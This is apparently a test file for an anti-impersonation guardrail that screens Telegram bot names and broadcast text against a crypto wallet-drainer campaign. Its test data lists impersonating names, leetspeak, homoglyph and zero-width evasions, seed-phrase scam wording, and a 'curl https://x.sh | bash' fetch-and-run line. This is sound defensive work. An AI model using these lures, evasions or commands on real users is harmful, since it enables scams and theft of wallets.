import { describe, expect, it } from 'bun:test'
import { heuristicBlueprint, sanitizeBlueprint } from '../services/tenantBots/blueprint'
import {
	checkBroadcastCopy,
	checkImpersonation,
	normalizeName,
} from '../services/tenantBots/impersonation'

/**
 * We ship the primitive that the live "Safeguard" malware campaign abuses: a
 * way to stand up an official-looking Telegram bot in two minutes. These tests
 * are written from the attacker's chair — every case is a way someone would
 * actually try to get an impersonating bot hosted on our infrastructure.
 *
 * The false-positive cases matter just as much. A guardrail that blocks real
 * meme-coin names is one the team routes around, and then it protects nobody.
 */

describe('legitimate names are not blocked', () => {
	it('allows ordinary project bots', () => {
		const fine = [
			'PEPE Burn Bot',
			'Doge Community',
			'My Cool Token',
			'WIF Utility Bot',
			'Bonk Buyback',
			'Mog Nation',
			'Turbo Toad Bot',
			'$FOO price bot',
			'Gigachad Community Bot',
			'ArbiPepe',
		]
		for (const name of fine) {
			expect(checkImpersonation(name).allowed).toBe(true)
		}
	})
})

describe('protected identities', () => {
	it('refuses bots named after exchanges, wallets and issuers', () => {
		for (const name of [
			'USDC Support',
			'Binance Airdrop',
			'MetaMask Helper',
			'Coinbase Rewards',
			'Ledger Live Assistant',
			'Telegram Verify',
			'Uniswap Claims',
			'Tether Bot',
		]) {
			expect(checkImpersonation(name).allowed).toBe(false)
		}
	})

	it('refuses a bot borrowing our own name', () => {
		// A tenant bot called "Suwappu Support" would borrow trust we never gave.
		const v = checkImpersonation('Suwappu Support')
		expect(v.allowed).toBe(false)
		expect(v.matched).toBe('suwappu')
	})
})

describe('authority-role names — the shape of the live attack', () => {
	it('refuses security, verification and support framing', () => {
		for (const name of [
			'Safeguard Verification',
			'Wallet Verify Bot',
			'Official Security Bot',
			'Token Guardian',
			'Community Admin Bot',
			'Customer Service',
			'Wallet Connect Helper',
			'Recovery Assistant',
			'KYC Portal',
			'Claim Portal',
		]) {
			expect(checkImpersonation(name).allowed).toBe(false)
		}
	})

	it('explains itself so an honest team knows what to change', () => {
		const v = checkImpersonation('Safeguard Verification')
		expect(v.message).toBeTruthy()
		expect(v.message).toContain('safeguard')
		// Actionable, not just "denied".
		expect(v.message!.toLowerCase()).toContain('try a name')
	})
})

describe('evasion', () => {
	it('sees through leetspeak', () => {
		for (const name of ['5afegu4rd', 'S4feguard', 'V3rify Bot', 'B1nance Support']) {
			expect(checkImpersonation(name).allowed).toBe(false)
		}
	})

	it('sees through letter spacing and punctuation', () => {
		for (const name of ['S a f e g u a r d', 'S-a-f-e-g-u-a-r-d', 'S.a.f.e_g.u.a.r.d']) {
			expect(checkImpersonation(name).allowed).toBe(false)
		}
	})

	it('sees through Cyrillic and Greek homoglyphs', () => {
		// Cyrillic Ѕ / е / а render identically to Latin in a Telegram list.
		for (const name of ['Ѕafeguard', 'Vеrify Bot', 'Binаnce Support']) {
			expect(checkImpersonation(name).allowed).toBe(false)
		}
	})

	it('sees through zero-width characters', () => {
		expect(checkImpersonation('Safe​guard').allowed).toBe(false)
	})

	it('normalises confusables to the same string a human reads', () => {
		expect(normalizeName('Ѕ4fe­guard')).toContain('safeguard')
		expect(normalizeName('W A L L E T')).toBe('w a l l e t')
	})
})

describe('the Telegram handle is checked, not just the display name', () => {
	it('refuses a clean display name over an impersonating handle', () => {
		// The handle is what a victim sees in a forwarded message.
		const v = checkImpersonation('Nice Token', 'usdc_verify_bot')
		expect(v.allowed).toBe(false)
	})

	it('allows a clean handle', () => {
		expect(checkImpersonation('Nice Token', 'nicetoken_bot').allowed).toBe(true)
	})
})

describe('broadcast copy screening', () => {
	it('refuses wallet-drainer wording', () => {
		for (const text of [
			'Press Windows + R and paste this to verify',
			'Send your seed phrase to restore access',
			'Verify your wallet to claim the airdrop',
			'connect your wallet to claim your allocation',
			'run: curl https://x.sh | bash',
		]) {
			expect(checkBroadcastCopy(text).allowed).toBe(false)
		}
	})

	it('leaves ordinary community copy alone', () => {
		for (const text of [
			'gm, price is up 12% today',
			'Burn complete — 1.2M PEPE destroyed',
			'New listing announcement at 3pm UTC',
		]) {
			expect(checkBroadcastCopy(text).allowed).toBe(true)
		}
	})
})

describe('the composer cannot propose a blocked name', () => {
	it('drops a model-proposed impersonating name back to the project name', () => {
		const bp = sanitizeBlueprint(
			{ name: 'USDC Verification Bot', branding: { displayName: 'USDC Verification Bot' } },
			{ brief: 'make it look official', projectName: 'Pepe Coin' },
			'llm',
		)
		expect(checkImpersonation(bp.name).allowed).toBe(true)
		expect(checkImpersonation(bp.branding.displayName).allowed).toBe(true)
		expect(bp.name).toBe('Pepe Coin')
	})

	it('leaves a legitimate proposed name alone', () => {
		const bp = sanitizeBlueprint(
			{ name: 'Pepe Burn Bot', branding: { displayName: 'Pepe Burn Bot' } },
			{ brief: 'burn bot', projectName: 'Pepe Coin' },
			'llm',
		)
		expect(bp.name).toBe('Pepe Burn Bot')
	})

	it('never lets the keyword fallback produce a blocked name either', () => {
		const bp = heuristicBlueprint({ brief: 'a security verification bot', tokenSymbol: 'PEPE' })
		expect(checkImpersonation(bp.name).allowed).toBe(true)
	})
})
